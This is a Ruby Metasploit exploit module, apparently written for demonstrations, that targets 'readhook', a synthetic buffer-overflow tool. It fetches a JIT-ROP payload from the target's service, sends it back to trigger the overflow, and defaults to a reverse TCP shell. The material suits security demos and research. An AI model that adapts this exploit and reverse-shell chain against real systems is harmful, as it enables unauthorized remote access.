class MetasploitModule < Msf::Exploit::Remote
    Rank = ManualRanking

    include Msf::Exploit::Remote::HttpClient

    module Target
        Linux = 0 # Generic Linux
    end

    def initialize(info = {})
        super(
            update_info(
                info,
                'Name'           => 'readhook',
                'Description'    => 'Exploit for readhook synthetic buffer overflow tool',
                'Author'         => [ 'Polyverse Corporation' ],
                'License'        => MSF_LICENSE,
                'References'     => [ [ 'URL', 'https://polyverse.com' ], ],
                'Platform'       => [ 'linux' ],
                'Payload'        => { },
                'Arch'           => [ ARCH_X64 ],
                'Targets'        => [ [ 'Linux x64', { 'Arch' => ARCH_X64, } ] ],
                'DefaultTarget'  => Target::Linux,
                'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/shell_reverse_tcp' }
            )
        )

        register_options(
        [
            Opt::LPORT(5555),
            Opt::RPORT(8080),
            OptString.new('READHOOK_BASE_URI', [true, 'The base path for READHOOK magic.', '/xyzzy']),
            OptBool.new('INTERACTIVE', [false, 'Interactive mode for live audiences and video generation.', false])
        ], self.class)
    end

    # Endian-sensitive string-to-integer converter
    def str_to_int(str)
        if str.length > 8
            return nil
        end

        n = 0
        for i in 1..str.length
            if Rex::Arch.endian(target.arch) == ENDIAN_LITTLE
                n = (n << 8) + str[str.length - i].ord
            else
                n = (n << 8) + str[i - 1].ord
            end
        end

        return n
    end

    # Formatter for binary string to hex string
    def str_to_str16(str)
        return str.unpack('H*')
    end

    # Returns that the remote host is always vulnerable
    def check
        return Exploit::CheckCode::Vulnerable
    end

    Offset = Struct.new(:r, :b, :f) do
    end

    AddressUnion = Struct.new(:p, :o, :c) do
    end

    # Define a struct representing the example payload from READHOOK.
    Payload = Struct.new(:sf_dst, :sf_canary, :sf_rbp, :rc_popRDI, :rc_stackPage, :rc_popRSI, :rc_stackSize, :rc_popRDX, :rc_permission, :rc_noop, :rc_mprotect, :rc_pivot, :pl_scu) do
        def from_makeload(encoded)
            print "encoded: ", encoded, " (length: ", encoded.length().to_s(), ")\n"
            decoded = Rex::Text.decode_base64(encoded)
            print "decoded: ", decoded, " (length: ", decoded.length().to_s(), ")\n"
            recoded = Rex::Text.encode_base64(decoded)
            print "recoded: ", recoded, " (length: ", recoded.length().to_s(), ")\n"
            self.print_table
            self.sf_canary = 1000
        end

        def print_pair(name, value)
            puts("#{name}".ljust(13) + " => " + "#{value}".ljust(16))
        end

        def print_table()
            each_pair {|name, value| print_pair(name, value) }
        end
    end

    def exploit
        # Print utility for a header
        def print_header(hdr)
            print_status("-------------------------------------------------------------------")
            print_status("#{hdr}")
            print_status("-------------------------------------------------------------------")
        end

        # Print utility for a separator
        def print_separator()
            print_status("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
        end

        def interact(step, action)
            print_status()
            print_status("STEP #{step}: #{datastore['INTERACTIVE'] ? "Press <Enter>" : "Proceed"} to #{action}")
            if datastore['INTERACTIVE']
                c = gets[0].chomp().downcase()
                exit() if c == 'q'
                return step if c == 'r'
            end

            return step + 1
        end

        # Check for vulnerability
        def checktarget(step)
            begin
                nextstep = interact(step, "Check if target is vulnerable.")
                exit() if check() != Exploit::CheckCode::Vulnerable
            end while nextstep == step

            return nextstep
        end

        # Ask READHOOK for a payload that will give us a reverse shell from the remote host
        def getpayload(step)
            begin
                nextstep = interact(step, "Request JITROP Payload.")
                uri = datastore['READHOOK_BASE_URI'] + "MAKEJROP" + datastore['LHOST'] + ':' + datastore['LPORT'].to_s(10)
                res = send_request_cgi( { 'method' => 'GET', 'uri' => uri } )
                exit() if !res || res.code != 200
                
                print_status(res.body)
            end while nextstep == step

            return nextstep, res.body
        end

        def dumppayload(step, payload)
            step = interact(step, "Ask readhook to dump the payload...")
            res = send_request_cgi( { 'method' => 'GET', 'uri' => payload.gsub("OVERFLOW", "DUMPLOAD") } )

            return step
        end

        def showpayload(step, payload)
            step = interact(step, "Show the payload from readhook")
            print_status(payload)

           return step
        end

        def putpayload(step, payload)
            step = interact(step, "Send JITROP payload back to server...")
            res = send_request_cgi( { 'method' => 'GET', 'uri' => payload } )

            return step
        end

        print_status("Start...")

        step          = checktarget(1)
        step, payload = getpayload(step)
        step          = putpayload(step, payload)
 
        print_status("Done. (If successful, you should get a promptless shell.)")
    end
end
